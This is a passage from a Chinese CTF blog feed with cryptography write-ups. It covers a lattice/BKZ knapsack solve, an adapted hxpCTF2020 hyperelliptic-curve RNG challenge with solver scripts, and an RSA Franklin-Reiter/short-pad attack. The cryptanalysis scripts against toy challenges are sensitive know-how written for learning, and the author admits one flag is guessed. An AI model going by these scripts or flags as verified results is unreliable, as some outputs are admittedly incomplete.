Decimal(&#x27;340942741029472675751209085563496509709453734782185827155063370803195952763341.5492681559934516393628&#x27;), Decimal(&#x27;363065426053956876789136573439806831974720562089628946045509535722562500188081.9345554269406941498189&#x27;), Decimal(&#x27;389906219234236504589839583602940131460157322576695243167328885608693810978037.4477298393894375836391&#x27;), Decimal(&#x27;397628552821546031788284866976481005071491904149911534621248760160933669557251.4099945654069429986781&#x27;), Decimal(&#x27;418115729169523563213795873608243120399117141324174913328486917994007765693981.2677229007073901042419&#x27;), Decimal(&#x27;430002268137029940210248704949846802606196021901113383903617291334026458415238.4390037473159660462055&#x27;), Decimal(&#x27;435517219435792978548914327540992832715555899417703687725132714593809971489386.4866743125661788819556&#x27;), Decimal(&#x27;445816634674050036737403156155461234669588861822924489511566801569753428925196.7122521424369127568677&#x27;), Decimal(&#x27;459728395552222169203258553855093151725069310363221663578223702572833827483180.5712997266924709004859&#x27;), Decimal(&#x27;472146579573229247119622639984879073370128462957392372371001752039887754216862.2605246111880684783030&#x27;), Decimal(&#x27;476006673323706912851925923936227700248085741335072682402231383534286110106849.6653976943352393620303&#x27;), Decimal(&#x27;486870143000003523136729364348591878682677901545106867214896561445453739365505.3439314072483902595509&#x27;), Decimal(&#x27;493584608712480022671713045430033257561446779236439588774651853861690675528490.3655085296010121315316&#x27;), Decimal(&#x27;496801262478540279019120702773153789961300482567894655561867654179758267817025.5210934638564971187839&#x27;), Decimal(&#x27;505947495650660962867352926325259167807382070922044420606608075589355194666475.2011794828006546336392&#x27;), Decimal(&#x27;511666785983460201877755690981276626403123717604080991115075395552267140888834.5141513226162039281301&#x27;), Decimal(&#x27;519748583077886948223642831481589001894608334341623554432584379082164654601617.7552630658083904530520&#x27;)]</span></span><br></pre></td></tr></table></figure>

<p>这里因为格式的种种问题，直接将keys取整数提出来了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">keys = [<span class="number">80260960185991308862233904206310070533990667611589946606122867505419956976171</span>, <span class="number">127210612166669937440098469708903225618405881204503139663605609326034899514764</span>, <span class="number">186360178378489239360019555208872516895923557828929525429878875918225512971166</span>, <span class="number">225321001627212097357564035919404985096695078055324870037864774600825628967482</span>, <span class="number">277657303409607584257674154656459195924000370301674371438196861060248384105244</span>, <span class="number">297000844888383098784779809484430885883324243241834148304083596811292939014380</span>, <span class="number">328063692363312405002199287825630301497469991361288129915249443621480610038009</span>, <span class="number">340942741029472675751209085563496509709453734782185827155063370803195952763341</span>, <span class="number">363065426053956876789136573439806831974720562089628946045509535722562500188081</span>, <span class="number">389906219234236504589839583602940131460157322576695243167328885608693810978037</span>, <span class="number">397628552821546031788284866976481005071491904149911534621248760160933669557251</span>, <span class="number">418115729169523563213795873608243120399117141324174913328486917994007765693981</span>, <span class="number">430002268137029940210248704949846802606196021901113383903617291334026458415238</span>, <span class="number">435517219435792978548914327540992832715555899417703687725132714593809971489386</span>, <span class="number">445816634674050036737403156155461234669588861822924489511566801569753428925196</span>, <span class="number">459728395552222169203258553855093151725069310363221663578223702572833827483180</span>, <span class="number">472146579573229247119622639984879073370128462957392372371001752039887754216862</span>, <span class="number">476006673323706912851925923936227700248085741335072682402231383534286110106849</span>, <span class="number">486870143000003523136729364348591878682677901545106867214896561445453739365505</span>, <span class="number">493584608712480022671713045430033257561446779236439588774651853861690675528490</span>, <span class="number">496801262478540279019120702773153789961300482567894655561867654179758267817025</span>, <span class="number">505947495650660962867352926325259167807382070922044420606608075589355194666475</span>, <span class="number">511666785983460201877755690981276626403123717604080991115075395552267140888834</span>, <span class="number">519748583077886948223642831481589001894608334341623554432584379082164654601617</span>]</span><br></pre></td></tr></table></figure>

<p>构造格</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">m = matrix(ZZ, <span class="number">25</span>, <span class="number">25</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>):</span><br><span class="line">    m[i, i]=<span class="number">1</span></span><br><span class="line">    m[<span class="number">24</span>, i] = keys[i]</span><br><span class="line">m[<span class="number">24</span>, <span class="number">24</span>]= -ct1</span><br><span class="line"></span><br><span class="line">c1= m.transpose().BKZ()[<span class="number">0</span>]</span><br></pre></td></tr></table></figure>

<p>跑出来</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c1 = [<span class="number">102</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">103</span>, <span class="number">123</span>, <span class="number">55</span>, <span class="number">49</span>, <span class="number">53</span>, <span class="number">99</span>, <span class="number">51</span>, <span class="number">57</span>, <span class="number">99</span>, <span class="number">51</span>, <span class="number">45</span>, <span class="number">49</span>, <span class="number">98</span>, <span class="number">52</span>, <span class="number">54</span>, <span class="number">45</span>, <span class="number">52</span>, <span class="number">99</span>, <span class="number">50</span>, <span class="number">51</span>, <span class="number">45</span>, <span class="number">845</span>]</span><br></pre></td></tr></table></figure>

<p>同理</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c2 = [<span class="number">56</span>, <span class="number">48</span>, <span class="number">48</span>, <span class="number">54</span>, <span class="number">45</span>, <span class="number">50</span>, <span class="number">55</span>, <span class="number">98</span>, <span class="number">52</span>, <span class="number">51</span>, <span class="number">101</span>, <span class="number">98</span>, <span class="number">97</span>, <span class="number">50</span>, <span class="number">52</span>, <span class="number">52</span>, <span class="number">54</span>, <span class="number">125</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">604</span>]</span><br></pre></td></tr></table></figure>

<p>最后转一下ascii</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> c1:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> c2:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(<span class="string">&#x27;0x66def695b20eeae3141ea80240e9bc7138c8fc5aef20532282944ebbbad76a6e17446e92de5512091fe81255eb34a0e22a86a090e25dbbe3141aff0542f5&#x27;</span>, <span class="number">16</span>)))</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag&#123;715c39c3-1b46-4c23-͍<span class="number">8006</span>-27b43eba2446&#125;      ɜ</span><br></pre></td></tr></table></figure>

<p>有点奇怪，把奇怪的地方去掉，就好了</p>
<h2 id="hpcurve（unsolved）"><a href="#hpcurve（unsolved）" class="headerlink" title="hpcurve（unsolved）"></a>hpcurve（unsolved）</h2><p>完全不懂，师傅没必要看了，只是改脚本的屑</p>
<h3 id="一、题目-1"><a href="#一、题目-1" class="headerlink" title="一、题目"></a>一、题目</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env sage</span></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> SystemRandom</span><br><span class="line"></span><br><span class="line">p = <span class="number">10000000000000001119</span></span><br><span class="line">R.&lt;x&gt; = GF(p)[]</span><br><span class="line">y=x</span><br><span class="line">f = y + y^<span class="number">7</span></span><br><span class="line">C = HyperellipticCurve(f, <span class="number">0</span>)</span><br><span class="line">J = C.jacobian()</span><br><span class="line"></span><br><span class="line">es = [SystemRandom().randrange(p**<span class="number">3</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">Ds = [J(C(x, <span class="built_in">min</span>(f(x).sqrt(<span class="number">0</span>,<span class="number">1</span>)))) <span class="keyword">for</span> x <span class="keyword">in</span> (<span class="number">11</span>,<span class="number">22</span>,<span class="number">33</span>)]</span><br><span class="line">q = []</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">clk</span>():</span></span><br><span class="line">	<span class="keyword">global</span> Ds,es</span><br><span class="line">	Ds = [e*D <span class="keyword">for</span> e,D <span class="keyword">in</span> <span class="built_in">zip</span>(es, Ds)]</span><br><span class="line">	<span class="keyword">return</span> Ds</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate</span>():</span></span><br><span class="line">    u,v = <span class="built_in">sum</span>(clk())</span><br><span class="line">    rs = [u[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)] + [v[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">    <span class="keyword">assert</span> <span class="number">0</span> <span class="keyword">not</span> <span class="keyword">in</span> rs <span class="keyword">and</span> <span class="number">1</span> <span class="keyword">not</span> <span class="keyword">in</span> rs</span><br><span class="line">    q = struct.pack(<span class="string">&#x27;&lt;&#x27;</span>+<span class="string">&#x27;Q&#x27;</span>*<span class="built_in">len</span>(rs), *rs)</span><br><span class="line">    <span class="keyword">return</span> q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;flag&#123;xxxxxxx&#125;&quot;</span></span><br><span class="line">text = <span class="string">&#x27;a&#x27;</span>*<span class="number">20</span>+flag</span><br><span class="line">t = <span class="string">&#x27;&#x27;</span></span><br><span class="line">keys = generate()</span><br><span class="line">leng = <span class="built_in">len</span>(keys)</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> text:</span><br><span class="line">    t += <span class="built_in">chr</span>(<span class="built_in">ord</span>(keys[i%leng])^^<span class="built_in">ord</span>(x))</span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(t.encode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line"><span class="comment">#for x,y in zip(RNG(),flag):</span></span><br><span class="line"></span><br><span class="line">flag&#123;1b82f60a-43ab-4f18-8ccc</span><br></pre></td></tr></table></figure>

<h3 id="二、解题脚本"><a href="#二、解题脚本" class="headerlink" title="二、解题脚本"></a>二、解题脚本</h3><p>是hxpCTF2020的题目</p>
<p>原题是</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env sage</span></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> SystemRandom</span><br><span class="line"></span><br><span class="line">p = <span class="number">10000000000000001119</span></span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; = GF(p)[]; y=x</span><br><span class="line">f = y + prod(<span class="built_in">map</span>(<span class="built_in">eval</span>, <span class="string">&#x27;yyyyyyy&#x27;</span>))</span><br><span class="line">C = HyperellipticCurve(f, <span class="number">0</span>)</span><br><span class="line">J = C.jacobian()</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RNG</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.es = [SystemRandom().randrange(p**<span class="number">3</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">        self.Ds = [J(C(x, <span class="built_in">min</span>(f(x).sqrt(<span class="number">0</span>,<span class="number">1</span>)))) <span class="keyword">for</span> x <span class="keyword">in</span> (<span class="number">11</span>,<span class="number">22</span>,<span class="number">33</span>)]</span><br><span class="line">        self.q = []</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">clk</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.Ds = [e*D <span class="keyword">for</span> e,D <span class="keyword">in</span> <span class="built_in">zip</span>(self.es, self.Ds)]</span><br><span class="line">        <span class="keyword">return</span> self.Ds</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__call__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.q:</span><br><span class="line">            u,v = <span class="built_in">sum</span>(self.clk())</span><br><span class="line">            rs = [u[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)] + [v[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">            <span class="keyword">assert</span> <span class="number">0</span> <span class="keyword">not</span> <span class="keyword">in</span> rs <span class="keyword">and</span> <span class="number">1</span> <span class="keyword">not</span> <span class="keyword">in</span> rs</span><br><span class="line">            self.q = struct.pack(<span class="string">&#x27;&lt;&#x27;</span>+<span class="string">&#x27;Q&#x27;</span>*<span class="built_in">len</span>(rs), *rs)</span><br><span class="line">        r, self.q = self.q[<span class="number">0</span>], self.q[<span class="number">1</span>:]</span><br><span class="line">        <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__iter__</span>(<span class="params">self</span>):</span> <span class="keyword">return</span> self</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__next__</span>(<span class="params">self</span>):</span> <span class="keyword">return</span> self()</span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>).read().strip()</span><br><span class="line"><span class="keyword">import</span> re; <span class="keyword">assert</span> re.match(<span class="string">r&#x27;hxp\&#123;\w+\&#125;&#x27;</span>, flag, re.ASCII)</span><br><span class="line"></span><br><span class="line">text = <span class="string">f&quot;Hello! The flag is: <span class="subst">&#123;flag&#125;</span>&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(k^^m <span class="keyword">for</span> k,m <span class="keyword">in</span> <span class="built_in">zip</span>(RNG(), text.encode())).<span class="built_in">hex</span>())</span><br></pre></td></tr></table></figure>

<p>显然代码对比起来看，<code>f = y + y^7</code>只是<code>f = y + prod(map(eval, &#39;yyyyyyy&#39;))</code>变换一种形式，主要的不同在</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">t += <span class="built_in">chr</span>(<span class="built_in">ord</span>(keys[i%leng])^^<span class="built_in">ord</span>(x))</span><br></pre></td></tr></table></figure>

<p>这个key的长度不够，是循环取的</p>
<p>找了一些脚本，没怎么看原理</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">p = <span class="number">10000000000000001119</span></span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; = GF(p)[]; y=x</span><br><span class="line">f = y + prod(<span class="built_in">map</span>(<span class="built_in">eval</span>, <span class="string">&#x27;yyyyyyy&#x27;</span>))</span><br><span class="line">C = HyperellipticCurve(f, <span class="number">0</span>)</span><br><span class="line">J = C.jacobian()</span><br><span class="line">Ds = [J(C(x, <span class="built_in">min</span>(f(x).sqrt(<span class="number">0</span>,<span class="number">1</span>)))) <span class="keyword">for</span> x <span class="keyword">in</span> (<span class="number">11</span>,<span class="number">22</span>,<span class="number">33</span>)]</span><br><span class="line"></span><br><span class="line">enc = <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;a0955c882185b50a69d9d19a24778519d6da23894e667d7130b495b645caac72163d242923caa00af845f25890&#x27;</span>)</span><br><span class="line">known_pt = <span class="string">&#x27;Hello! The flag is: hxp&#123;&#x27;</span>.encode()</span><br><span class="line"></span><br><span class="line">rng_output = <span class="built_in">bytes</span>(e^^m <span class="keyword">for</span> e,m <span class="keyword">in</span> <span class="built_in">zip</span>(enc, known_pt))</span><br><span class="line"></span><br><span class="line">blocks = [rng_output[i:i+<span class="number">8</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(rng_output), <span class="number">8</span>)]</span><br><span class="line">ui = [<span class="built_in">int</span>.from_bytes(r, <span class="string">&#x27;little&#x27;</span>) <span class="keyword">for</span> r <span class="keyword">in</span> blocks]</span><br><span class="line">u = x^<span class="number">3</span> + ui[<span class="number">2</span>]*x^<span class="number">2</span> + ui[<span class="number">1</span>]*x + ui[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">L = GF(p).algebraic_closure()</span><br><span class="line">roots = [r[<span class="number">0</span>] <span class="keyword">for</span> r <span class="keyword">in</span> u.change_ring(L).roots()]</span><br><span class="line"></span><br><span class="line">RR.&lt;zz&gt; = PolynomialRing(L)</span><br><span class="line">v = RR.lagrange_polynomial([(xi, f(xi).sqrt()) <span class="keyword">for</span> xi <span class="keyword">in</span> roots])</span><br><span class="line">vi = [v.coefficients()[i].as_finite_field_element()[<span class="number">1</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">vi = [(<span class="built_in">int</span>(-c), <span class="built_in">int</span>(c)) <span class="keyword">for</span> c <span class="keyword">in</span> vi]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> rs <span class="keyword">in</span> itertools.product(*vi):</span><br><span class="line">    q = struct.pack(<span class="string">&#x27;&lt;&#x27;</span>+<span class="string">&#x27;Q&#x27;</span>*<span class="built_in">len</span>(rs), *rs)</span><br><span class="line"></span><br><span class="line">    flag = <span class="built_in">bytes</span>(k^^m <span class="keyword">for</span> k,m <span class="keyword">in</span> <span class="built_in">zip</span>(rng_output+q, enc))</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p>稍微改了下，<code>enc</code>和<code>known_pt</code>是显然要改的，后者就选24度好了，和原脚本一样，虽然题目给了很大一半</p>
<p>还有就是最后这里，就使得key不要越界，取个余</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> rs <span class="keyword">in</span> itertools.product(*vi):</span><br><span class="line">    q = struct.pack(<span class="string">&#x27;&lt;&#x27;</span>+<span class="string">&#x27;Q&#x27;</span>*<span class="built_in">len</span>(rs), *rs)</span><br><span class="line">    l = rng_output+q</span><br><span class="line">    length = <span class="built_in">len</span>(l)</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">        flag += <span class="built_in">chr</span>(l[i % length] ^^ enc[i])</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p>不完全正确的exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">p = <span class="number">10000000000000001119</span></span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; = GF(p)[]; y=x</span><br><span class="line">f = y + prod(<span class="built_in">map</span>(<span class="built_in">eval</span>, <span class="string">&#x27;yyyyyyy&#x27;</span>))</span><br><span class="line">C = HyperellipticCurve(f, <span class="number">0</span>)</span><br><span class="line">J = C.jacobian()</span><br><span class="line">Ds = [J(C(x, <span class="built_in">min</span>(f(x).sqrt(<span class="number">0</span>,<span class="number">1</span>)))) <span class="keyword">for</span> x <span class="keyword">in</span> (<span class="number">11</span>,<span class="number">22</span>,<span class="number">33</span>)]</span><br><span class="line"></span><br><span class="line">enc = <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;66def695b20eeae3141ea80240e9bc7138c8fc5aef20532282944ebbbad76a6e17446e92de5512091fe81255eb34a0e22a86a090e25dbbe3141aff0542f5&#x27;</span>)</span><br><span class="line">known_pt = (<span class="string">&#x27;a&#x27;</span> * <span class="number">20</span> + <span class="string">&#x27;flag&#x27;</span>).encode()</span><br><span class="line"></span><br><span class="line">rng_output = <span class="built_in">bytes</span>(e^^m <span class="keyword">for</span> e,m <span class="keyword">in</span> <span class="built_in">zip</span>(enc, known_pt))</span><br><span class="line"></span><br><span class="line">blocks = [rng_output[i:i+<span class="number">8</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(rng_output), <span class="number">8</span>)]</span><br><span class="line">ui = [<span class="built_in">int</span>.from_bytes(r, <span class="string">&#x27;little&#x27;</span>) <span class="keyword">for</span> r <span class="keyword">in</span> blocks]</span><br><span class="line">u = x^<span class="number">3</span> + ui[<span class="number">2</span>]*x^<span class="number">2</span> + ui[<span class="number">1</span>]*x + ui[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">L = GF(p).algebraic_closure()</span><br><span class="line">roots = [r[<span class="number">0</span>] <span class="keyword">for</span> r <span class="keyword">in</span> u.change_ring(L).roots()]</span><br><span class="line"></span><br><span class="line">RR.&lt;zz&gt; = PolynomialRing(L)</span><br><span class="line">v = RR.lagrange_polynomial([(xi, f(xi).sqrt()) <span class="keyword">for</span> xi <span class="keyword">in</span> roots])</span><br><span class="line">vi = [v.coefficients()[i].as_finite_field_element()[<span class="number">1</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">vi = [(<span class="built_in">int</span>(-c), <span class="built_in">int</span>(c)) <span class="keyword">for</span> c <span class="keyword">in</span> vi]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> rs <span class="keyword">in</span> itertools.product(*vi):</span><br><span class="line">    q = struct.pack(<span class="string">&#x27;&lt;&#x27;</span>+<span class="string">&#x27;Q&#x27;</span>*<span class="built_in">len</span>(rs), *rs)</span><br><span class="line">    l = rng_output+q</span><br><span class="line">    length = <span class="built_in">len</span>(l)</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">        flag += <span class="built_in">chr</span>(l[i % length] ^^ enc[i])</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p>出来</p>
<img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211007201746271.png" alt="image-20211007201746271"/>

<p>我看最后一串挺执着的，加上已经知道<code>flag&#123;1b82f60a-43ab-4f18-8ccc</code></p>
<p>大胆连在一起</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">flag&#123;1b82f60a-43ab-4f18-8ccc-97d120aae6fc&#125;</span><br></pre></td></tr></table></figure>

<p>感觉应该是对的</p>
]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
      <tags>
        <tag>格</tag>
      </tags>
  </entry>
  <entry>
    <title>20210522 NEEPU Sec2021公开赛Crypto方向WP</title>
    <url>/posts/e22cbbee/</url>
    <content><![CDATA[<p>和buu一个风格的网站</p>
<p>又是被组员嘲讽的一天</p>
<span id="more"></span>

<h1 id="NEEPU-Sec2021公开赛"><a href="#NEEPU-Sec2021公开赛" class="headerlink" title="NEEPU Sec2021公开赛"></a>NEEPU Sec2021公开赛</h1><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h3><p>组员都做出来，自己都没有想到，反思一下</p>
<h4 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h4><p>代码并不复杂，常规的运算</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> nextprime</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span> (<span class="params">p1,p2,e</span>):</span></span><br><span class="line">    not_hint = (p1 + <span class="number">1</span>) * (p2 + <span class="number">1</span>)</span><br><span class="line">    S = gmpy2.invert(e, not_hint)</span><br><span class="line">    not_p = S%(p1+<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> not_p</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;Neepu&#123;********************&#125;&#x27;</span></span><br><span class="line">flag = bytes_to_long(flag)</span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p*q</span><br><span class="line">e = nextprime(random.randint(<span class="number">1</span>,<span class="number">1000</span>))</span><br><span class="line">d = gmpy2.invert(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">c = <span class="built_in">pow</span>(flag, e, n)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"></span><br><span class="line">m = encode(p, q, e)</span><br><span class="line">c1 = <span class="built_in">pow</span>(m, <span class="number">7</span>, n)</span><br><span class="line">c2 = <span class="built_in">pow</span>(m+e, <span class="number">7</span>, n)</span><br><span class="line"><span class="built_in">print</span>(c1)</span><br><span class="line"><span class="built_in">print</span>(c2)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;78543767285872349029076059073458316000847341792088805258173041942425687239313215276670106926320359777962661495032475004417723103701253550583245518206305422982968675291500865382213182669036827898932991063338163290845510339896689210314509493839746410486257998875782496654704288722251878269643040214139429715671&#x27;</span></span><br><span class="line"><span class="string">&#x27;91995272927105081122659192011056020468305570748555849650309966887236871318156855318666540461669669247866754568189179687694315627673545298267458869140096224628114424176937828378360997230874932015701507629238213240839370628366083111028544554453150572165461450371411341485911677167168492357154684642531577228543&#x27;</span></span><br><span class="line"><span class="string">&#x27;10186066785511829759164194803209819172224966119227668638413350199662683285189286077736537161204019147791799351066849945954518642600518196927152098131117402608793752080104402893792812059620726950782670809837962606250674588612783027976958719051829085903720655233948024280118985875980227528403883475592567727892&#x27;</span></span><br><span class="line"><span class="string">&#x27;46182103994299145562022812023438495797686077104477472631494150222038404419414100727667171290098624214113241032861128455086601197239761085752413519627251290509474327611253599768650908336142621210005389246714504358370629231557080301516460985022782887233790302054696967900384601182742759555421864610431428746119&#x27;</span></span><br></pre></td></tr></table></figure>

<h4 id="题目解析"><a href="#题目解析" class="headerlink" title="题目解析"></a>题目解析</h4><p>首先套了一个短的padding的，用Related Message Attack可以整出来，接用la师傅的脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">short_pad_attack</span>(<span class="params">c1, c2, e, n</span>):</span></span><br><span class="line">    PRxy.&lt; x, y &gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    PRx.&lt; xn &gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    PRZZ.&lt; xz, yz &gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    g1 = x ^ e - c1</span><br><span class="line">    g2 = (x + y) ^ e - c2</span><br><span class="line">    q1 = g1.change_ring(PRZZ)</span><br><span class="line">    q2 = g2.change_ring(PRZZ)</span><br><span class="line">    h = q2.resultant(q1)</span><br><span class="line">    h = h.univariate_polynomial()</span><br><span class="line">    h = h.change_ring(PRx).subs(y=xn)</span><br><span class="line">    h = h.monic()</span><br><span class="line">    kbits = n.nbits() // (<span class="number">2</span> * e * e)</span><br><span class="line">    diff = h.small_roots(X=<span class="number">2</span> ^ kbits, beta=<span class="number">0.4</span>)[<span class="number">0</span>]  <span class="comment"># find root &lt; 2^kbits with factor &gt;= n^0.4</span></span><br><span class="line">    <span class="keyword">return</span> diff</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">related_message_attack</span>(<span class="params">c1, c2, diff, e, n</span>):</span></span><br><span class="line">    PRx.&lt; x &gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    g1 = x ^ e - c1</span><br><span class="line">    g2 = (x + diff) ^ e - c2</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">gcd</span>(<span class="params">g1, g2</span>):</span></span><br><span class="line">        <span class="keyword">while</span> g2:</span><br><span class="line">            g1, g2 = g2, g1 % g2</span><br><span class="line">        <span class="keyword">return</span> g1.monic()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> -gcd(g1, g2)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    c2 = <span class="number">10186066785511829759164194803209819172224966119227668638413350199662683285189286077736537161204019147791799351066849945954518642600518196927152098131117402608793752080104402893792812059620726950782670809837962606250674588612783027976958719051829085903720655233948024280118985875980227528403883475592567727892</span></span><br><span class="line">    c1 = <span class="number">46182103994299145562022812023438495797686077104477472631494150222038404419414100727667171290098624214113241032861128455086601197239761085752413519627251290509474327611253599768650908336142621210005389246714504358370629231557080301516460985022782887233790302054696967900384601182742759555421864610431428746119</span></span><br><span class="line">    n = <span class="number">91995272927105081122659192011056020468305570748555849650309966887236871318156855318666540461669669247866754568189179687694315627673545298267458869140096224628114424176937828378360997230874932015701507629238213240839370628366083111028544554453150572165461450371411341485911677167168492357154684642531577228543</span></span><br><span class="line">    e = <span class="number">7</span></span><br><span class="line">    diff = short_pad_attack(c1, c2, e, n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;difference of two messages is %d&quot;</span> % diff)</span><br><span class="line">    m1 = related_message_attack(c1, c2, diff, e, 